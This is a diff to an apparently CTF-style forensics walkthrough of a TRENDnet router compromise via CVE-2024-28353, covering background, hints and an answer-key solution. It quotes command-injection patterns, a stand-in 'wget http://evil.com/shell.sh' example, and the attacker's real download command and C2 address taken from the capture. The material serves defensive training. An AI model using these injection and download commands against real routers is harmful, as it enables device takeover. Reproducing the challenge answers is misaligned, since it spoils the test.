@@ -5,72 +5,114 @@
   "htbUrl": "https://app.hackthebox.com/sherlocks/Trent",
   "difficulty": "medium",
   "estimatedTime": "3-4 hours",
-  "keyTakeaway": "Router command injection exploitation — analyzing CVE-2024-28353 against IoT/network devices, from initial compromise to reverse shell establishment",
-  "tags": ["wireshark", "router", "command-injection", "cve-2024-28353", "iot", "reverse-shell"],
+  "keyTakeaway": "Router/IoT exploitation forensics — analyzing command injection (CVE-2024-28353) against network devices, from login brute force through parameter injection to reverse shell establishment",
+  "tags": ["wireshark", "router", "command-injection", "cve-2024-28353", "iot", "reverse-shell", "networkminer", "trendnet"],
   "fundamentals": {
-    "content": "## Router Exploitation & Command Injection\n\n### Why Routers Are High-Value Targets\n\nRouters and IoT devices are attractive targets because:\n- They often run **outdated firmware** with known vulnerabilities\n- They have **weak or default credentials** (admin/admin, admin/blank)\n- They sit at **network boundaries** — compromising one gives access to all traffic\n- They're often **overlooked** in security monitoring\n\n### CVE-2024-28353: TRENDnet TEW-827DRU Command Injection\n\nThis vulnerability affects the TRENDnet TEW-827DRU router's web management interface. The `usbapps.config.smb_admin_name` parameter in the SMB configuration page doesn't properly sanitize input, allowing **OS command injection**.\n\nAn attacker who can access the admin panel can inject shell commands through this parameter, gaining code execution on the router's underlying Linux OS.\n\n### Command Injection Patterns\n\nIn HTTP traffic, command injection looks like:\n```\nlegitimate_value; malicious_command\nlegitimate_value | malicious_command  \nlegitimate_value $(malicious_command)\nlegitimate_value `malicious_command`\n```\n\nThe semicolon (`;`) or pipe (`|`) breaks out of the expected parameter context and executes arbitrary commands.\n\n### Analyzing Router Exploitation in PCAPs\n\n| Phase | Network Evidence |\n|-------|------------------|\n| Admin login | HTTP POST to router login page (often plaintext) |\n| Exploitation | HTTP POST with injected commands in parameters |\n| Payload delivery | wget/curl downloading scripts to `/tmp/` |\n| Reverse shell | Outbound TCP connection from router to attacker |\n\n### Reverse Shell Detection\n\nAfter command injection, attackers typically:\n1. Download a shell script to the router (`wget http://attacker/shell.sh -O /tmp/shell.sh`)\n2. Make it executable (`chmod +x /tmp/shell.sh`)\n3. Execute it to establish a reverse shell back to their C2 server\n\nIn the PCAP, this appears as:\n- HTTP GET request from router to attacker's server (downloading the script)\n- New TCP connection from router to attacker on a specific port (the reverse shell)",
+    "content": "## Router Exploitation & IoT Forensics\n\nThis final challenge in the trail focuses on **network device exploitation** — an increasingly important area as IoT and router vulnerabilities become prime targets. You'll analyze a command injection attack against a router's web management interface.\n\n### Why Routers Are High-Value Targets\n\nRouters and IoT devices are attractive targets because:\n- They often run **outdated firmware** with known vulnerabilities\n- They have **weak or default credentials** (admin/admin, or no password at all)\n- They sit at **network boundaries** — compromising one gives access to all traffic\n- They're often **overlooked** in security monitoring and patching\n\n### Command Injection Vulnerabilities\n\n**Command injection** occurs when user input is passed to a system shell without proper sanitization. The attacker breaks out of the expected input context:\n\n```\nlegitimate_value; malicious_command\nlegitimate_value | malicious_command  \nlegitimate_value $(malicious_command)\n```\n\nFor example, if a router's SMB admin name field passes input to a shell command:\n```\nExpected: admin_user\nAttacker: admin_user; wget http://evil.com/shell.sh\n```\n\n### CVE-2024-28353: TRENDnet TEW-827DRU\n\nThis vulnerability (CVSS 8.8) affects the TRENDnet TEW-827DRU router's web management interface. The `usbapps.config.smb_admin_name` parameter in the SMB/USB configuration page doesn't sanitize input, allowing OS command injection.\n\nThe attack requires admin panel access — but if the router has default or empty credentials, the attacker gets both access and RCE.\n\n### Analyzing Router Exploitation in PCAPs\n\n| Phase | Network Evidence |\n|-------|------------------|\n| Admin login | HTTP POST to router login page (credentials in POST body) |\n| Login failures | HTTP responses with error messages or redirects |\n| Exploitation | HTTP POST with injected commands in form parameters |\n| Payload delivery | wget/curl from router to external server |\n| Reverse shell | Outbound TCP connection from router to attacker |\n\n### NetworkMiner for Router Forensics\n\nNetworkMiner is particularly useful for router analysis:\n- **Credentials tab**: Automatically extracts login credentials from HTTP POST data\n- **Files tab**: Reconstructs files transferred over HTTP (including downloaded shell scripts)\n- **Hosts tab**: Identifies the router model and firmware from HTTP responses\n\n### Identifying Firmware Versions\n\nRouter firmware versions are often visible in:\n- HTTP response pages (status pages like `adm_status.asp`)\n- Server headers\n- Specific API endpoints\n\nNetworkMiner can automatically reassemble these pages, making it easy to read the firmware version without manually following TCP streams.\n\n### Reverse Shell from Router to C2\n\nAfter achieving command injection, attackers typically:\n1. Download a shell script: `wget http://attacker:port/shell.sh -O /tmp/shell.sh`\n2. Make it executable: `chmod +x /tmp/shell.sh`\n3. Execute it: `/tmp/shell.sh`\n\nThe reverse shell appears as a new outbound TCP connection from the router to the attacker's IP on a specific port. The download port and C2 port are often different.",
     "toolReferences": [
       {
         "tool": "Wireshark",
         "commands": [
-          "Filter: http.request.method == POST (admin login + exploitation)",
-          "Filter: http.host == <router_ip> (traffic to router admin panel)",
-          "Filter: http.request.uri contains \"usbapps\" (CVE-specific parameter)",
-          "Follow HTTP streams to see injected commands",
-          "Filter: tcp.port == 41143 (or C2 port) to find reverse shell",
-          "File > Export Objects > HTTP (extract downloaded scripts)"
+          "Filter: http.request.method == POST — admin login and exploitation",
+          "Filter: http.request.uri contains \"usbapps\" — CVE-specific parameter",
+          "Follow TCP Stream — read injected commands and responses",
+          "File → Export Objects → HTTP — extract downloaded scripts"
+        ]
+      },
+      {
+        "tool": "NetworkMiner",
+        "commands": [
+          "Credentials tab — extracted login credentials",
+          "Files tab — reassembled HTTP objects (status pages, scripts)",
+          "Hosts tab — device identification"
         ]
       }
     ]
   },
   "hints": {
     "hints": [
-      "Identify the router model first — look at HTTP traffic to the device's web interface. The server banner or page content reveals the model.",
-      "The admin panel uses weak credentials. Look at the HTTP POST login request — the password field reveals how the router was accessed.",
-      "The vulnerable parameter is in the SMB/USB configuration section of the router. Look for POST requests that modify USB sharing settings.",
+      "Start with NetworkMiner to get a quick overview — the Credentials tab shows login attempts, the Files tab shows reassembled pages including the router status page with firmware version.",
+      "Count the failed login attempts before the successful one. The successful login has a notable password characteristic.",
+      "The vulnerable parameter is in the USB/SMB sharing configuration. Look for POST requests that modify these settings — the injected command is in a form field.",
       "After gaining command injection, the attacker downloads a script. Look for HTTP requests FROM the router TO an external server.",
-      "The reverse shell script has a specific filename — extract it from the HTTP objects.",
-      "The C2 connection uses a specific IP and port. Look for an outbound TCP connection from the router that wasn't there before the exploitation."
+      "The reverse shell connects to a different port than the download server. Look for an outbound TCP connection from the router after the script executes.",
+      "When the attacker makes a typo in the injection, the router returns a specific error message. Check the HTTP responses for failed exploitation attempts."
     ]
   },
   "solution": {
-    "content": "## Full Walkthrough\n\n**Scenario:** A TRENDnet router on Forela's network was compromised via a command injection vulnerability. The attacker gained admin access to the router's web panel, injected commands through a vulnerable parameter, and established a reverse shell for persistent access.\n\n**Key findings:**\n\n| Element | Detail |\n|---------|--------|\n| Router model | TEW-827DRU |\n| Admin password | (blank/empty) |\n| CVE | CVE-2024-28353 |\n| Vulnerable parameter | `usbapps.config.smb_admin_name` |\n| Reverse shell script | `a1l4m.sh` |\n| C2 | `35.159.25.253:41143` |",
+    "content": "## Full Walkthrough\n\n**Scenario:** The SOC team detected suspicious lateral movement targeting a router. Anomalous traffic patterns and command execution were identified on a TRENDnet router. An attacker exploited a command injection vulnerability to gain RCE and establish a reverse shell.\n\n**Key learning:** This challenge introduces IoT/network device forensics. Router attacks differ from server attacks — the admin interface is HTTP-based, exploitation targets device-specific parameters, and the payload must work within the router's limited shell environment.\n\n**Network layout:**\n\n| Role | IP Address |\n|------|----------|\n| Attacker | `192.168.10.2` |\n| Router | `192.168.10.1` |\n| External C2/download | `35.159.25.253` |",
     "steps": [
       {
         "stepNumber": 1,
-        "description": "Identify the router model",
-        "command": "Wireshark filter: http (examine traffic to the router's web interface)",
-        "explanation": "Look at HTTP traffic to the router's management interface. The response pages or headers identify it as a **TRENDnet TEW-827DRU** — a dual-band wireless AC router. This model is known to be vulnerable to CVE-2024-28353 in its web management interface. **Answer: `TEW-827DRU`**"
+        "description": "Identify the attacker's IP address",
+        "command": "Wireshark: examine HTTP traffic to the router's web interface",
+        "explanation": "Look at HTTP requests to the router's management interface. The IP making login attempts and subsequent requests is the attacker.\n\n**Answer:** `192.168.10.2`"
       },
       {
         "stepNumber": 2,
-        "description": "Find the admin credentials used",
-        "command": "Wireshark filter: http.request.method == POST (to router IP)",
-        "explanation": "Filter for POST requests to the router's login page. The login request shows the username `admin` with a **blank password**. Default or empty credentials on network devices are extremely common and are often the first thing attackers try. **Answer: blank/empty password**"
+        "description": "Identify the router model",
+        "command": "NetworkMiner Files tab → look for status/admin pages",
+        "explanation": "NetworkMiner reassembles HTTP response pages. Look for router status pages (like `adm_status.asp.html`) that display the device model.\n\n**Answer:** `TEW-827DRU`"
       },
       {
         "stepNumber": 3,
-        "description": "Identify the vulnerable parameter and injected command",
-        "command": "Follow HTTP POST streams to the router after login",
-        "explanation": "After authenticating, the attacker navigates to the USB/SMB sharing configuration. Look at POST requests modifying USB settings. The parameter `usbapps.config.smb_admin_name` contains the injected command — instead of a legitimate SMB admin username, it contains a command injection payload (using `;` or `|` to break out of the expected input). **Answer: `usbapps.config.smb_admin_name`**"
+        "description": "Count failed login attempts before success",
+        "command": "Wireshark filter: http.request.method == POST → examine login attempts",
+        "explanation": "Filter for POST requests to the router's login page. Count the attempts that received error responses before the successful login.\n\n**Answer:** `2`"
       },
       {
         "stepNumber": 4,
-        "description": "Find the downloaded reverse shell script",
-        "command": "File > Export Objects > HTTP (look for script downloads FROM the router)",
-        "explanation": "The injected command downloads a reverse shell script to the router. Look for HTTP GET requests originating FROM the router to an external server. The script downloaded is `a1l4m.sh` — a shell script that establishes a persistent reverse shell connection. **Answer: `a1l4m.sh`**"
+        "description": "Find the timestamp of the successful login",
+        "command": "Identify the first successful login response timestamp",
+        "explanation": "The successful login POST request and its response occur at a specific UTC time.\n\n**Answer:** `2024-05-01 15:53:27`"
       },
       {
         "stepNumber": 5,
-        "description": "Identify the C2 server and port",
-        "command": "Look for outbound TCP connections from the router after script execution",
-        "explanation": "After `a1l4m.sh` executes, the router establishes a reverse shell connection. Look for a new TCP connection from the router to an external IP. The C2 server is `35.159.25.253` on port `41143`. Following this TCP stream would show the attacker's interactive shell commands on the router. **Answer: `35.159.25.253:41143`**"
+        "description": "Determine the password length",
+        "command": "NetworkMiner Credentials tab, or examine POST body",
+        "explanation": "Look at the `log_pass` variable in the login POST request. The password field is empty — the admin interface had no password set at all. This is depressingly common with routers.\n\n**Answer:** `0`"
       },
       {
         "stepNumber": 6,
-        "description": "Reconstruct the full router compromise",
-        "command": "Correlate all phases",
-        "explanation": "Complete attack chain: (1) Attacker discovers TEW-827DRU router on the network → (2) Logs into admin panel with blank password → (3) Navigates to USB/SMB settings → (4) Injects OS command via `usbapps.config.smb_admin_name` parameter (CVE-2024-28353) → (5) Injected command downloads `a1l4m.sh` from attacker's server → (6) Script establishes reverse shell to `35.159.25.253:41143`. This demonstrates why IoT/network devices need firmware updates, strong credentials, and restricted management interface access."
+        "description": "Find the firmware version",
+        "command": "NetworkMiner Files tab → open the status page",
+        "explanation": "The reassembled router status page shows the current firmware version installed on the device.\n\n**Answer:** `2.10`"
+      },
+      {
+        "stepNumber": 7,
+        "description": "Identify the vulnerable HTTP parameter",
+        "command": "Follow HTTP POST streams to the router after login",
+        "explanation": "After authenticating, the attacker navigates to the USB/SMB sharing configuration. Look at POST requests modifying USB settings (`/apply_sec.cgi` or `/apply.cgi`). The form parameter containing the injected command is the SMB admin name field.\n\n**Answer:** `usbapps.config.smb_admin_name`"
+      },
+      {
+        "stepNumber": 8,
+        "description": "Identify the CVE",
+        "command": "Search for the router model + vulnerable parameter",
+        "explanation": "The TRENDnet TEW-827DRU with command injection via `usbapps.config.smb_admin_name` maps to a specific CVE with CVSS 8.8.\n\n**Answer:** `CVE-2024-28353`"
+      },
+      {
+        "stepNumber": 9,
+        "description": "Find the first command executed via injection",
+        "command": "Follow the HTTP stream of the first exploitation POST",
+        "explanation": "The first command injected through the vulnerable parameter is standard initial reconnaissance — the attacker confirms they have code execution.\n\n**Answer:** `whoami`"
+      },
+      {
+        "stepNumber": 10,
+        "description": "Find the reverse shell download command",
+        "command": "Follow HTTP streams showing command injection after whoami",
+        "explanation": "After confirming RCE, the attacker injects a command to download a reverse shell script from an external server. The full wget command is visible in the POST body.\n\n**Answer:** `wget http://35.159.25.253:8000/a1l4m.sh`"
+      },
+      {
+        "stepNumber": 11,
+        "description": "Find the error when the attacker made a typo",
+        "command": "Check HTTP responses for failed injection attempts",
+        "explanation": "Not all injection attempts succeed. When the attacker makes a typo in the injection, the router's web server returns a specific error message instead of executing the command.\n\n**Answer:** `Access to this resource is forbidden`"
+      },
+      {
+        "stepNumber": 12,
+        "description": "Find the C2 IP and port for the reverse shell",
+        "command": "Look for outbound TCP connections from the router after script execution",
+        "explanation": "After the reverse shell script executes, the router establishes an outbound connection to the attacker's C2 server. The C2 IP matches the download server, but the port is different from the HTTP download port (8000).\n\n**Answer:** `35.159.25.253:41143`"
       }
     ]
   },
